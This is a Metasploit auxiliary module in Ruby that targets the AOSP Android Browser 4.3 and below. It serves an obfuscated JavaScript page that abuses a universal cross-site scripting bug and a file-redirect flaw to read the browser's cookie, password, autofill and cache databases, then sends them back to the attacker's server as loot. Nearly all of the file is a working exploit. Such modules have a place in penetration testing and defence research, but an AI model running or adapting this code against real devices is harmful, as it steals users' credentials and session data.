##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/jsobfu'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report
  include Msf::Exploit::JSObfu

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Android Browser File Theft',
      'Description' => %q{
        This module steals the cookie, password, and autofill databases from the
        Browser application on AOSP 4.3 and below.
      },
      'Author'         => [
        'Rafay Baloch', # Found UXSS bug in Android Browser
        'joev'          # File redirect and msf module
      ],
      'License'     => MSF_LICENSE,
      'Actions'     => [[ 'WebServer' ]],
      'PassiveActions' => [ 'WebServer' ],
      'References' =>
        [
          # patch for file redirection, 2014
          ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],
          ['URL', 'https://code.google.com/p/chromium/issues/detail?id=90222'] # the UXSS
        ],
      'DefaultAction'  => 'WebServer'
    ))

     register_options([
      OptString.new('ADDITIONAL_FILES', [
        false,
        'Comma-separated list of addition file URLs to steal.',
      ]),
      OptBool.new('DEFAULT_FILES', [
        true,
        'Steals a default set of file URLs',
        true
      ])
    ], self.class)
  end

  def run
    exploit
  end

  def on_request_uri(cli, request)
    if request.method.downcase == 'post'
      process_post(cli, request)
      send_response_html(cli, '')
    else
      print_status("Sending exploit landing page...")
      send_response_html(cli, exploit_html)
    end
  end

  def process_post(cli, request)
    data = JSON.parse(request.body)
    file = File.basename(data['url'])
    print_good "File received: #{request.body.length.to_f/1024}kb #{file}"
    loot_path = store_loot(
      file,
      'application/x-sqlite3',
      cli.peerhost,
      data,
      File.basename(data['url']),
      "#{cli.peerhost.ljust(16)} Android browser file"
    )
    print_good "Saved to: #{loot_path}"
  end


  def file_urls
    default_urls = [
      'file:///data/data/com.android.browser/databases/webviewCookiesChromium.db',
      'file:///data/data/com.android.browser/databases/webview.db',
      'file:///data/data/com.android.browser/databases/autofill.db',
      'file:///data/data/com.android.browser/databases/browser2.db',
      'file:///data/data/com.android.browser/app_appcache/ApplicationCache.db',
      'file:///data/data/com.android.browser/app_databases/Databases.db',
      'file:///data/data/com.android.browser/databases/webviewCookiesChromiumPrivate.db'
    ]

    unless datastore['DEFAULT_FILES']
      default_urls = []
    end

    default_urls + (datastore['ADDITIONAL_FILES']||'').split(',')
  end

  def exploit_html
    %Q|
      <!doctype html>
      <html>
      <body>
      <script>#{exploit_js}</script>
      </body>
      </html>
    |
  end

  def exploit_js
    js_obfuscate %Q|

      window.onmessage = function(e) {
        var x = new XMLHttpRequest;
        x.open("POST", location.href);
        x.send(JSON.stringify(e.data))
      };

      var brokenFrame = document.createElement('iframe');
      brokenFrame.src = 'http://localhost:100';
      brokenFrame.setAttribute('style', 'position:absolute;left:-1000px;height:0;width:0;visibility:hidden;')
      brokenFrame.onload = function() {
        brokenFrame.onload = null;
        document.documentURI = 'javascript://hostname.com/%0D%0Aurls=(#{JSON.generate(file_urls)});'+
          'var t=function(){setTimeout(function(){next(urls.shift());},1)};window.onmessage=t;'+
          'var next=(function(url){if(!url)return;try{var f = document.createElement("iframe");f.src=url;f.onload=f'+
          'unction(){f.onload=null;document.documentURI="javascript://hostname.com/%250D%250Ax=new '+
          'XMLHttpRequest;x.open(String.fromCharCode(71,69,84),location.href);x.send();x.onload=fun'+
          'ction(){ top.postMessage({data:x.responseText,url:location.href}, String.fromCharCode(42));'+
          'parent.postMessage(1,String.fromCharCode(42));};x.onerror=function(){parent.postMessage(1,S'+
          'tring.fromCharCode(42))};";f.contentWindow.location = "";};document.body.appendChild(f);}catch(e){t();}});t();';
        brokenFrame.contentWindow.location = "";
      };

      document.body.appendChild(brokenFrame);
    |
  end

end
